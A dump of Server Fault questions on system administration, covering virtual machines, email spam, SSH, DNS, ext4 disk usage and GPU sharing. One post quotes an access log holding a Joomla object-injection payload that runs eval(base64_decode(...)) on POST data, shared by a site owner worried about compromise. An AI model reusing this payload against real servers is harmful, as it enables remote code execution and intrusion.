additional 2-3 VMs may be added as required</p>

<p>Can you please confirm:</p>

<ol>
<li>is the above split / configuration of VMs OK?</li>
<li>The physical box has two HDDs (each 1 TB). How would you use the HDDs? Shall I use SW RAID, or just install Windows on 1st HDD, use the second HDD for VMs and do the backups to external drives?</li>
<li>I have only one public IP v4 address. I was planning to use this IPv4 for RD gateway to allow access from internet. For communication between servers I wanted to use IPv6 only - is it possible to do it this way? Do you recommend it?</li>
<li>Anything else I should consider for such setup?</li>
</ol>

<p>Thanks, Pavel</p>
","<windows><architecture><infrastructure>","2017-12-02 19:06:30"
"886393","which monitoring tool is good for monitoring system hardware,software,user management and network activity for all kind of operating system?","<p>Please kindly suggest me the tool for monitoring the system hardware, software, applications, services, user management and network related activities of IT Infrastructure.</p>
","<linux><windows><monitoring><network-monitoring><system-monitoring>","2017-12-04 05:11:21"
"886477","Why am I getting 500 error while trying to send emails to some domains?","<p>Recently I've been seeing the following error while trying to send emails to some domains:</p>

<pre><code>Final-Recipient: name@example.com
Original-Recipient: name@example.com
Action: failed
Status: 5.0.0
Remote-MTA: dns; mail.example.com
Diagnostic-Code: smtp; 550 ""The mail server detected your message as spam and
    has prevented delivery.""
</code></pre>

<p>Neither my IP address nor my domain is blacklisted. The email is a simple test email without attachments or links.</p>

<p>What can I do or where can I get more information about this issue?</p>

<p>Thank you</p>
","<spam-marked>","2017-12-04 15:28:53"
"886591","Accessing https://35.198.218.44/ via Chrome","<p>I subscribed to a VM and Static IP address is 35.198.218.44</p>

<p>I ssh into vm via cygwin.  Local port forwarding works fine.  i could ping vm and get response from my computer</p>

<p>I am trying to browse via Chrome by giving <a href=""https://35.198.218.44/"" rel=""nofollow noreferrer"">https://35.198.218.44/</a> or <a href=""https://35.198.218.44:8888"" rel=""nofollow noreferrer"">https://35.198.218.44:8888</a></p>

<p>I get ERR_CONNECTION_REFUSED in return</p>

<p>Not sure why this happens.</p>

<p>Tried the remedies posted in web, but nothing works</p>
","<google-compute-engine>","2017-12-05 06:13:29"
"886654","Able to connect the other ports however unable to connect the SSH port (22) of EC2 instance","<p>I am having two ec2-instance with OS Amazon linux (instance1 and instance2) mapped with same security groups and I am able to ssh the 'instance2'. However I am unable to SSH the instance1, this instance1 is working till I am change the IAM roles. Even now I am able to connect the DB port of the instance1. Please advise me your thoughts in this</p>

<p>For more information, I have added the SSH logs below:</p>

<pre><code>➤ ssh -v -i /drives/c/Users/vishwa/Downloads/machine.pem ec2-user@ip
OpenSSH_7.1p2, OpenSSL 1.0.1g 7 Apr 2014
debug1: Reading configuration data /etc/ssh_config
debug1: Connecting to IP [IP] port 22.
debug1: connect to address IP port 22: Connection timed out
ssh: connect to host IP port 22: Connection timed out
</code></pre>
","<ssh><amazon-ec2><amazon-web-services><amazon-linux>","2017-12-05 13:24:13"
"886707","What is the best way to give root access to an account without using sudo?","<p>I have an HP-UX server where I need to create a special user account for an application to interact with, and this account must have full root privileges. Sudo is not an option in this. The only thing I can think of is to assign the account UID 0. Would this work to make the account functionally root? Is there some better way to do this without using sudo? </p>
","<unix><hp-ux>","2017-12-05 17:32:22"
"886746","How to fix the invalid name in the ssl certificate","<p>I generated ssl certificate with:</p>

<pre><code>openssl genrsa -out key.pem 2048
openssl req -new -sha256 -key key.pem -out csr.csr
openssl req -x509 -sha256 -days 12775 -key key.pem -in csr.csr -out certificate.pem
</code></pre>

<p>but after checking my openssl server with ssllab I got the following invalid message:
<a href=""https://i.sstatic.net/qpAUQ.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/qpAUQ.jpg"" alt=""enter image description here""></a></p>

<p>How to fix this issue?</p>
","<security><ssl><openssl>","2017-12-05 20:29:52"
"886830","Emails are going to spam while checks are good","<p>I used G Suite for sending emails and the problem was that my mails were in in spam because they were sent from the Google servers, <strong>some of these IP's are on the popular blacklist</strong> now. Google knows about this problem and they said: ""We're trying to arrange with blacklist support, so you should wait and maybe in future all will be OK"". Of course this variant I don't like.</p>

<p>I have a correct DKIM / DMARC / SPF records in my domains. <strong>Spam score</strong> (I used <a href=""https://www.mail-tester.com"" rel=""nofollow noreferrer"">Mail Tester</a> for testing) was always near <strong>8/10</strong>. Because the sender IP was in ~4 blacklists.</p>

<p>So I decided to use the Zoho Mail hosting. I set up one of my domains and go to Zoho. But the problem is the same: <strong>my emails are going to spam</strong> (on Gmail and others mailboxes). All checks are good, <strong>spam score</strong> on Mail Tester is <strong>10/10</strong>, sometimes sender IP was just on 1 blacklist (Mail Tester said that IP isn't on any blacklist).</p>

<p>Also, I opened the original message and ALL checks are 'pass'.</p>

<p><strong>What can be the problem?</strong> <strong>Any suggestions?</strong></p>
","<email><spam><gmail>","2017-12-06 08:57:03"
"886870","Use role vars in Ansible Jinja2 template loop","<p>I have a dictionary of vars in an Ansible role ( in roles/my_role/vars/main.yml ):</p>

<pre><code>my_vars:
  - name: var1
    string: var1_string
  - name: var1
    string: var1_string
</code></pre>

<p>I want to include all of these in a single file constructed with a jinja2 templates loop:</p>

<pre><code>{% for v in my_vars %}
    ""{{ v.string }}""
{% endfor %}
</code></pre>

<p>Will this work? Can the J2 templating engine refer to vars in roles/my_role/vars/main.yml in this way? Or is it limited to globals vars and vars specific to the play the initiates the templating engine?</p>
","<ansible><ansible-playbook>","2017-12-06 14:20:43"
"886886","Did someone succeeded in getting to my server?","<p>I have a server running ubuntu 14.04. On it i have latest wordpress version on nginx. I was going trough my logs and noticed this.</p>

<pre><code>198.204.224.122 - - [05/Dec/2017:13:06:10 +0200] ""GET / HTTP/1.1"" 200 826 ""-"" ""}__test|O:21:\x22JDatabaseDriverMysqli\x22:3:{s:4:\x22\x5C0\x5C0\x5C0a\x22;O:17:\x22JSimplepieFactory\x22:0:{}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:{s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:5:\x22cache\x22;b:1;s:19:\x22cache_name_function\x22;s:6:\x22assert\x22;s:10:\x22javascript\x22;i:9999;s:8:\x22feed_url\x22;s:54:\x22eval(base64_decode($_POST[111]));JFactory::get();exit;\x22;}i:1;s:4:\x22init\x22;}}s:13:\x22\x5C0\x5C0\x5C0connection\x22;i:1;}\xF0\x9D\x8C\x86""
</code></pre>

<p>I looked around the internet and i found that it use to be joomla problem but im still worried because i see that that request was handled with status code 200.
Later on i noticed this happening in my logs</p>

<blockquote>
  <p>162.158.92.173 0.058 - [05/Dec/2017:13:35:13 +0200]   ""GET /wp-admin/users.php HTTP/1.1"" 200 10389 "" /wp-admin/update-core.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.002 - [05/Dec/2017:13:35:13 +0200]   ""GET /wp-admin/load-scripts.php?c=1&amp;load%5B%5D=hoverIntent,common,admin-bar,svg-painter,heartbeat,wp-auth-check&amp;ver=4.9.1 HTTP/1.1"" 200 12580 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.035 - [05/Dec/2017:13:36:14 +0200]   ""POST /wp-admin/admin-ajax.php HTTP/1.1"" 200 78 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.033 - [05/Dec/2017:13:37:15 +0200]   ""POST /wp-admin/admin-ajax.php HTTP/1.1"" 200 78 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.030 - [05/Dec/2017:13:39:16 +0200]   ""POST /wp-admin/admin-ajax.php HTTP/1.1"" 200 78 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.028 - [05/Dec/2017:13:41:17 +0200]   ""POST /wp-admin/admin-ajax.php HTTP/1.1"" 200 78 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.033 - [05/Dec/2017:13:43:18 +0200]   ""POST /wp-admin/admin-ajax.php HTTP/1.1"" 200 78 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.031 - [05/Dec/2017:13:45:19 +0200]   ""POST /wp-admin/admin-ajax.php HTTP/1.1"" 200 78 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.030 - [05/Dec/2017:13:47:28 +0200]   ""POST /wp-admin/admin-ajax.php HTTP/1.1"" 200 78 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.060 - [05/Dec/2017:13:47:29 +0200]   ""GET /wp-admin/users.php HTTP/1.1"" 200 10389 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""
  162.158.92.173 0.029 - [05/Dec/2017:13:48:30 +0200]   ""POST /wp-admin/admin-ajax.php HTTP/1.1"" 200 78 "" /wp-admin/users.php"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47""</p>
</blockquote>

<p>Should i be worried ?
By the way i am running fail2ban however i have cloudflare aswell which makes it harder for me to ban the ips.</p>
","<nginx><wordpress><fail2ban>","2017-12-06 16:01:45"
"886975","My ext4 file system actually contains 2/3 as much as df/tune2fs says it does. Why?","<p>I have a 45-ish-gig virtual drive connected to a VM as my root partition. </p>

<pre><code>root@alang-web:~# df -h
Filesystem        Size  Used Avail Use% Mounted on
udev              2.0G     0  2.0G   0% /dev
tmpfs             396M  5.6M  390M   2% /run
/dev/sda1          46G   41G  2.3G  95% /
tmpfs             2.0G     0  2.0G   0% /dev/shm
tmpfs             5.0M     0  5.0M   0% /run/lock
tmpfs             2.0G     0  2.0G   0% /sys/fs/cgroup
/dev/sdb1         148G   15G  126G  11% /mnt/data
cgmfs             100K     0  100K   0% /run/cgmanager/fs
alang-web-backup  621G  256G  366G  42% /media/sf_alang-web-backup
tmpfs             396M     0  396M   0% /run/user/1000
</code></pre>

<p>As you can see, it reports 41 gigs of 46 gigs used.</p>

<p>And then there's this:</p>

<pre><code>root@alang-web:~# du -shx /
27G /
</code></pre>

<p>And this:</p>

<pre><code>root@alang-web:~# tune2fs -l /dev/sda1
tune2fs 1.42.13 (17-May-2015)
...
Block count:              12058624
Reserved block count:     602931
Free blocks:              1209455
...
</code></pre>

<p>And going to init 1 and running a fsck -f / reports no errors of any kind.</p>

<p>Where the heck is that 41G - 27G = 14G of space that is supposedly being used but is not visible to du? It can't be doubly-hard-linked files, that would cause du to be HIGHER than df (and anyway I don't know what would be doing that). It can't be unlinked files that are still in use, I have rebooted multiple times and the numbers simply don't change much. Also there's this:</p>

<pre><code>COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NLINK    NODE NAME
php-fpm7.  992     root    3u   REG    8,1        0     0 1837559 /tmp/.ZendSem.dSWbfL (deleted)
mysqld    1020    mysql    4u   REG    8,1        0     0 1837551 /tmp/ibybXrs3 (deleted)
mysqld    1020    mysql    5u   REG    8,1        0     0 1837623 /tmp/ibVK2BUX (deleted)
mysqld    1020    mysql    6u   REG    8,1        0     0 1837628 /tmp/ibavDMmS (deleted)
mysqld    1020    mysql    7u   REG    8,1        0     0 1837629 /tmp/ib5MSHjH (deleted)
mysqld    1020    mysql   11u   REG    8,1        0     0 1837631 /tmp/ibf8ZvTB (deleted)
php-fpm7. 1067 www-data    3u   REG    8,1        0     0 1837559 /tmp/.ZendSem.dSWbfL (deleted)
php-fpm7. 1068 www-data    3u   REG    8,1        0     0 1837559 /tmp/.ZendSem.dSWbfL (deleted)
apache2   1088     root   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
apache2   1091 www-data   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
apache2   1092 www-data   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
apache2   1093 www-data   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
apache2   1094 www-data   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
apache2   1095 www-data   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
apache2   1275 www-data   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
apache2   1277 www-data   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
apache2   1278 www-data   40u   REG    8,1        0     0 1837632 /tmp/.ZendSem.3m0mZe (deleted)
</code></pre>

<p>Those are all the unlinked files that it lists for that file system currently. I don't know how big those are (perhaps the size is inaccurate for files that are unlinked, or perhaps those really are size-0 files that are being used for semaphores or something of the sort.) However, it seems kind of unlikely that they're 14 gigs.</p>

<p>Is there some subtlety of ext4 that I don't know about? I freely admit to being more familiar with ext3 and HFS+. Is this somehow sharing space with some other partition or something like that, and the command line tool df hasn't kept up with modern times? Is the drive just broken in a way fsck can't even detect, let alone fix?</p>

<p>Just to preempt one other suggestion:</p>

<pre><code>root@alang-web:~# cat &gt; /tmp/blar
adsf
root@alang-web:~# du -sh /tmp/*
4.0K    /tmp/blar
root@alang-web:~# 
</code></pre>

<p>So no, du does not report actual file sizes, it reports the size on disk including padding out to the next largest block size.</p>
","<linux><filesystems><ext4>","2017-12-07 07:06:54"
"887076","Does server clustering increase througput?","<p>I heard from a not technical person that combining two server(clustering) he can get more powerful server. He claims that then his computation take less time.  </p>

<p>Mainly, the person is from chemistry background. He uses <a href=""http://gaussian.com/g16main/"" rel=""nofollow noreferrer"">Gaussian</a> program in his server. </p>
","<cluster>","2017-12-07 16:40:55"
"887167","SFTP with data encryption at rest","<p>Sorry for my ignorance, I am having a peculiar doubt in setting up an SFTP server,</p>

<ol>
<li>setup an SFTP server with password/keyfile for authentication.</li>
<li>The SFTP user directory should be encrypted at rest.</li>
<li>The SFTP client should able to access to view the encrypted files, but other users should not be able to view it.</li>
</ol>

<p>I have setup the SFTP server, but I am unable to figure out the solution for the point 2 and 3, as I cannot format the system to create encrypted file system. </p>

<p>Is there any Open Source tool for this problem. Or my approach is terribly wrong.</p>
","<ubuntu-14.04><sftp><encryption>","2017-12-08 07:37:43"
"887182","Multi-Tenancy (Multi-user) GPU Container Infrastructure Solution","<p><strong>What we need:</strong> Several teams from different companies want to share our GPUs for deep learning tasks (three computers with several GPUs each). So manage multiple GPUs for multiple users.</p>

<ul>
<li>Different teams should not have access to the data of other teams.</li>
<li>Teams itsself should be able to run whatever container they need (with GPU, e.g. tensorflow, etc.)</li>
<li>Each team should have at least 8 GPUs and a maxmimum of e.g. 15 GPUs, so GPUs are used most of the time</li>
<li>Stats about GPU usage would be good to see who is not using them.</li>
<li>Access of several containers to same datasets (per team) to train on</li>
<li>Teams should not be able to escape the container, e..g mount '/' from the host to the docker container and delete / remove / edit random files on server which would lead to data breach.</li>
</ul>

<p><strong>Question:</strong> <em>What are the best open source tools to achieve this?</em></p>

<p>e.g. something like Rancher 2.0? Mesosphere? How should we set up storage? NFS? How does Uber? Google? Other DL startups do that?</p>

<p><strong>Similar unanswered questions:</strong></p>

<ul>
<li><a href=""https://stackoverflow.com/questions/44547889/managing-multiple-gpus-with-multiple-users"">https://stackoverflow.com/questions/44547889/managing-multiple-gpus-with-multiple-users</a></li>
<li><a href=""https://stackoverflow.com/questions/41201399/docker-server-for-multiple-users"">https://stackoverflow.com/questions/41201399/docker-server-for-multiple-users</a></li>
</ul>
","<docker><kubernetes><containers><cuda><operations-orchestration>","2017-12-08 10:55:08"
"813887","Is an un-updated windows instance without internet access safer than an updated one with one way Internet?","<p>I have several instances running windows server 2012 on AWS. The servers simply share drives for network access, and thus have no Public IP, and are not in a subnet that uses a NAT, aka no internet Access. This has been the case for about 2 years. </p>

<p>There has recently been some concern over the fact that these servers have not downloaded and installed windows updates in over 2 years, and there could be vulnerabilities these servers do not have patched. </p>

<p>The good news is, even if they are compromised somehow they cannot send data outside our network.</p>

<p>Is it worth (from a security pov) adding a NAT to the subnet just to allow these servers to get Updates?</p>
","<windows><amazon-web-services><routing><nat>","2016-11-08 22:10:10"
"813894","Are Rack-Servers always loud?","<p>So,
I'm thinking about getting a rack server (one blade) at home for stuff like gameserver, rendering, webserver, cloud etc but I'm worried about the loudness of the fans. 
I've only seen one single server rack in real life and it was pretty loud (and warm) so I'm unsure if every server is really that loud or if there can be pretty quite ones (if they are idle and not working).</p>

<p>Would it be possible to have a rack server that is as loud as a gaming pc tower? </p>

<p>And please don't give me replies like ""If you dont know that, then you don't need a server."" I'm a web dev but would like to learn about how to setup hardware aswell.</p>
","<rack><blade-server>","2016-11-08 22:20:32"
"887280","What do I scale up on a virtual server to take load off the CPU while uploading big files?","<p>I have a small photography portfolio website running on Ubuntu. It's a Digital Ocean <a href=""https://www.digitalocean.com/pricing/#droplet"" rel=""nofollow noreferrer"">droplet</a> with the following parameters:</p>

<ul>
<li>512RAM memory </li>
<li>1 vCPU</li>
<li>20GB SSD disk</li>
<li>1TB transfer</li>
</ul>

<p>This setup is sufficient for my needs when it comes to handling user traffic, which is very low. However, as the website features photos, I have an Admin Panel logic for creating new galleries - and the uploading part goes heavy on the server. </p>

<p>The files I upload are weight approx. 8MB; the photos are scaled down and saved locally in multiple (5) sizes. At times, there are 20 photos chosen for a gallery, uploaded asynchronously 3 at a time.</p>

<p>I noticed that when the upload is running, the CPU usage on the host jumps from 20 to 100%, while the memory usage stays at around 50-60%. Disk I/O also peaks. The upload process always succeeds but it's very slow and I have no clue what to enhance to speed it up.</p>

<p>I'm not good at this, so I'm looking for any insights on why would the upload process put so much load on the CPU and what should I scale up to increase the performance of the server and decrease the photos upload time.</p>

<p>Any ideas?</p>
","<web-server><performance><cpu-usage><digital-ocean>","2017-12-08 22:23:38"
"813945","PowerDNS : Respond differently based on Client IP address","<p>Currently I'm using Bind9 for my DNS server. </p>

<p>It was set-up in such a way that the server respond differently depending on which IP the request came from. I'm using Bind's View to achieve this. </p>

<p>The conf file is something similar to this : </p>

<pre><code>acl trusted { 192.168.7.0/24; localhost; };
acl guest   { 192.168.8.0/24; };

view trusted {
    match-clients { trusted; };

    allow-recursion { any; };

    zone ""myzone.example"" {
        type master;
        file ""db.myzone.example"";
    };
    zone ""7.168.192.in-addr.arpa"" {
        type master;
        file ""db.192.168.7"";
    };
};

view guest {
    match-clients { guest; };

    allow-recursion { any; };
};
</code></pre>

<p><strong>My question is :</strong> </p>

<ol>
<li>Is it possible to do the same with PowerDNS?</li>
<li>If yes, What is the easiest way to have it implemented?</li>
</ol>
","<domain-name-system><bind><dns-zone><powerdns><recursive>","2016-11-09 07:47:13"
"887317","How much of the modern internet based on client server architecture?","<p>I have checked google, didn't find any feasible answer. There are more than 3.5 billion internet users in this world, I want to know how much of these users using the client-server model of the internet.</p>
","<internet>","2017-12-09 12:34:40"
"887364","What can I do about an unsecure server?","<p>My university's servers are seriously outdated, store passwords in plaintext, and are running very old and unsecure versions of Apache.</p>

<p>I do not personally feel safe having my information stored on their network, however to access my courses I must.</p>

<p>Since I know nobody at the university will take me seriously, is there anything I can do to ensure that they make the network secure? Something like a 'better business bureau' for network security?</p>

<p>I'm not going to share the university or the security issues I have found since my information is available on that network.</p>
","<security>","2017-12-10 01:33:08"
"887471","The request was aborted: Could not create SSL/TLS secure channel on apche reverse proxy","<p>I have migrated Apache reverse proxy server from Apache 2.2 to Apache 2.4 from Centos 5.7 to Centos 7.3
and configure the new certificate on it
and user complain that The request was aborted: Could not create SSL/TLS secure channel</p>

<p>If anyone knows solution, please post the solution</p>
","<ssl><apache-2.4><reverse-proxy><centos7>","2017-12-11 04:34:26"
"887577","Do I need two replicating NAS devices for a trustworthy storage?","<p>I want to implement NAS solution for home usage, to keep data I care about. NAS offers RAID against disk failure, but what if the NAS box itself fails? Do I need two replicating NAS devices for a trustworthy storage? The amount of data is few Tb in size and while it is not many for a hard drive in these days, I think that much might be expensive to keep just in the cloud.</p>

<p>An idea that comes to my head is to buy two small single drive NAS boxes replicating each other. Would you recommend better solution?</p>
","<network-attached-storage>","2017-12-11 19:46:42"
"887598","get output of command execution in Rudder?","<p>I'm trying to use a User Technique in Rudder to monitor if my nodes has pending package updates.
I create a Technique that execute:
/usr/bin/apt-get update &amp;&amp; /usr/bin/apt-get list --upgradable</p>

<p>I also want to create another Technique to execute a command and get the free disk space.</p>

<p>I only get the non compliant report but I want to see the output of this commands in any place on Rudder server.</p>

<p>Is there any way to do that?</p>
","<command><rudder>","2017-12-11 22:00:59"
"887699","How to detect who restart my pc in office network","<p>i am very weak in server administration and networking. i work as a developer in a company. we have 15 employee in office sitting in different 15 pc. i am using windows 7 OS. i feel some one secretly restart my pc. we are using work group instead of domain.</p>

<p>so please suggest me how could i catch the thief who is restarting my pc.</p>

<p>is there any software which will maintain log of IP when some one restart my pc.</p>

<p>may be someone restart my pc by command or may be some one install a software running hiddenly in my pc which has two end like client &amp; server and the wicked person use anyone to restart my pc.</p>

<p>so please suggest me how to fight against it and how to catch the thief. thanks</p>
","<security><windows-7>","2017-12-12 12:47:21"
"814622","How did 10gbe happen without increasing the number of wires in the cable?","<p>The ethernet cable speed jump from 100Mb/s to 1Gb/s was possible because all of the wires were put to use in a patch cable. The jump from 1Gb/s to 10Gb/s required no such increase. How did they do this? </p>
","<ethernet><gigabit-ethernet><10gbethernet>","2016-11-13 07:24:15"
"814797","Install guest CentOS 7 on KVM also on CentOS7 without GUI","<p>I'm a bit stuck with virtualization on CentOS 7 using KVM. Whenever I try to create a virtual machine it keeps telling me to connect to the machine via console and finish the installation. Whenever I connect, I can't enter enything, I can only escape from the console.</p>

<p>The way I create the machine:</p>

<blockquote>
  <p>virt-install --name vm1 --network bridge:br0 --ram=1024 --vcpus=1
  --disk path=/var/lib/libvirt/imagesw.img,size=10 --graphics none --location=/mnt/iso</p>
</blockquote>

<p>The machine is running, at least that is what </p>

<blockquote>
  <p>virsh list --all</p>
</blockquote>

<p>telling me. How can I finish the installation and begin to use the guest OS from within the server? I have no GUI to access it, I use only terminal.</p>

<p>Thank you in advance!</p>

<p>B.R.: Bert</p>
","<kvm-virtualization><centos7><console><virsh>","2016-11-14 14:12:48"
"815635","Prioritizing Security Updates Across Web Server","<p>Single web server with LAMP stack, OpenSSL, and one Drupal site running on it. There are security updates available for the Linux Kernel, Apache, MySQL, PHP, OpenSSL, and Drupal.</p>

<p>Generally, is there a best practice for prioritizing these updates by risk of exploitation? Are there technical reasons one should be the higher priority for applying security updates vs another?</p>

<p>My initial thought was the the public facing pieces such as Drupal, OpenSSL and Apache are the highest priority for getting security updates applied since they are the most vulnerable to the outside world/the first to fall.</p>

<p>I was thinking of 'priority' defined as how quickly an update is applied after it is released (hours, day, months) or by frequency (every x weeks or months) updates are applied.</p>

<p>In that case, my ranking from highest to lowest priority:</p>

<ul>
<li>Drupal</li>
<li>OpenSSL</li>
<li>Apache</li>
<li>PHP</li>
<li>MySQL</li>
<li>Linux Kernel</li>
</ul>

<p>I realize this this would depend on the severity of each vulnerability and other factors but looking for best practice with reasoning if possible. </p>
","<linux><security><web-server><update>","2016-11-17 22:23:14"
"815675","Host name ""DNS"" at registrar versus AWS Route 53","<p>I'm moving a bunch of sites to a new hosting service.  They are explaining to me that I need to run my own DNS, which they are advising that I simply set a host name pointer at my registrar for <strong>dns1.foo.com</strong> and <strong>dns2.foo.com</strong> to the static IP address of the new virtual server.  Then all the sites specify those two as their nameservers.  I tried it, and it works.</p>

<p>I admit this is not my area of expertise but it seems to me to be a weak link to have all name resolution for these sites dependent on a host name setting at the registrar.</p>

<p>As an alternative, I experimented with a vanity DNS I have configured at AWS Route 53, simply adding glue records there that point new subs <strong>dns5</strong> and <strong>dns6</strong> to the static IP address of the server.  This routing works, my test sites all resolve using those as their nameservers.</p>

<p>So, what is the better answer here - the simple ""host name"" DNS pointer at the registrar, or use my vanity DNS for the mapping, at Route 53?</p>
","<domain-name-system><routing><amazon-route53>","2016-11-18 05:09:12"
"815700","how can i create cluster in vsphere 5.5?","<p>how can I open the cluster creating interface!       </p>

<p>this is what just was showed with me:           </p>

<p><a href=""https://i.sstatic.net/5HVv3.png"" rel=""nofollow noreferrer"">my interface</a>  </p>
","<vsphere-client>","2016-11-18 09:57:02"
"816038","RD-gateway like solution without implementation MS RDGW role","<p>Looking for a solution to connect to various Windows hosts based on port number.
I want to be able to choose which machine to connect to without needing to implement Microsoft's RDGW role.</p>

<p>It may sound a little petty, but the only reason I need this is to be able to use mstsc.exe without needing to configure the advanced tab with the rdgw settings on mstsc.exe.</p>

<p>Alternatively, if I could programmatically create an rdp file with the rdgw settings/credentials would also work - I couldn't find a way to do that. </p>

<p>Thanks.</p>
","<reverse-proxy><remote-desktop><rdp>","2016-11-21 07:38:38"
"816154","Sub Domain As CNAME Record Pointing To Another Domain","<p>I am a little confused here and after reading all over the place I haven't found an answer that matches my situation exactly.</p>

<p>I have been developing a large piece of software that will allow a user to access the system on their own domain name.</p>

<p>I am going to use domains : system.example1.com (which holds the system and can be directly accessed that way) and tester.example2.com (which will be the domain i want to access it via)</p>

<p>I can get all this working fine by using an A record to point tester.example2.com to the ip address of system.example1.com but I want to make this as easy as possible for system users by using a CNAME (if possible).</p>

<p>So as a test I created the sub domain on my domain at the registrar level (godaddy in this case) as a CNAME record like this: </p>

<p>CNAME tester.example2.com > system.example1.com TTL 1hr</p>

<p>But when I access tester.example2.com rather than seeing the system loading up as though I accessed system.example1.com directly, all I get is the apache default page.</p>

<p>The server is running cPanel by the way.</p>

<p>If I were doing this with an A record I would just park the tester.example2.com domain in cpanel, but I can't do that with a CNAME (as far as I know)</p>
","<apache-2.2><domain-name-system><domain><cname-record><cpanel>","2016-11-21 16:55:34"
"816294","Best server hypervisor that can be managed through a MAC","<p>I have a HP microserver gen 8 which I want to install a hypervisor on so I can install and run multiple VMs from remotely. I only have a MAC to use for administration, any ideas of good hyperVisors for this. </p>

<p>I looked into ESXi, Hyper-V and XenServer but they are all windows centric. </p>
","<virtualization><virtual-machines><mac>","2016-11-22 11:07:48"
"816299","How to solve the spam outgoing emails from a VPS?","<p>I bought a new VPS and using WHM i created a cpanel account.
After doing some research about why are the emails were going on spam
without any reasons and by this i mean :</p>

<pre><code> 1. No blacklisted IP,
 2. No blacklisted hostname,
 3. Normal emails with only text, not html,
 4. SPF, DKIM and PTR records configured .
</code></pre>

<p>If there is any other reasons for this please help me .</p>
","<email><vps><spam>","2016-11-22 11:33:19"
"887775","How to define a different name for each IP/NIC in the same PC","<p>In a machine with multiple IP(s)<br>
(all in the same subnet)<br>
Using NETBIOS or WINS (no DNS)</p>

<p>I want to PING this machine<br>
using a name for each IP (or a name for each NIC)</p>

<p>for example, this IP(s) are in the same computer: <br>
192.168.0.1 and 192.168.0.2</p>

<p>and I want to ping:<br></p>

<pre><code>server1 for 192.168.0.1
server2 for 192.168.0.1
</code></pre>

<p>Any ideas ?</p>
","<networking><netbios><wins>","2017-12-12 19:32:32"
"887778","Windows Server Use Ip address on iPhone","<p>I've a windows server. I need to be able to use its IP address to connect to the internet via my iPhone. I don't know if I've to set up a proxy on the server or if it's possible to use SOCKS and do a <a href=""http://www.makeuseof.com/tag/dedicated-virtual-server-internet-proxy-ssh-tunneling/"" rel=""nofollow noreferrer"">SSH Tunneling</a>, as with linux. Do you've any suggestion on how I can achieve this?  </p>
","<windows><windows-server-2008>","2017-12-12 19:38:01"
"887780","Install SCM software, accessible on the same PC all the time between Ubuntu and Windows?","<p>My PC is dual boot, Ubuntu 16.04 and Windows 10.</p>

<p>What would be the best approach to install SCM(Source Code Management) software but being able to use it(access it) all the time, from Windows and Ubuntu? </p>

<p>Should I create separate partition and install there an SCM solution?</p>

<p>Should I use Git which is decentralized or Visual SVN server? 
Maybe Git/Cygwin on Windows, Git shell/Terminal on Ubuntu?</p>

<p>Should the partition be formatted with NTFS since Windows doesn't read Linux partitions?</p>
","<git><ubuntu-16.04><windows-10><ntfs><visualsvn-server>","2017-12-12 19:44:27"
"816446","DNS for domain name","<p>When I purchase a domain name, do I also automatically get an ip address associated with that domain name?<br>
Reason for asking this is because online explanations says DNS resolves your domain name to and ip address or the ip address is provisioned later once I create a web site and host it on a server, and that server ip address becomes the ip address which is associated with said domain name?</p>

<p>In my AWS account under domain records, NS has few lines of entries in the formate <code>ns-23.awsdns-02.com</code>. I understand that this is a DNS, but why do I have 4 or 5 of them, isn't one enough?</p>
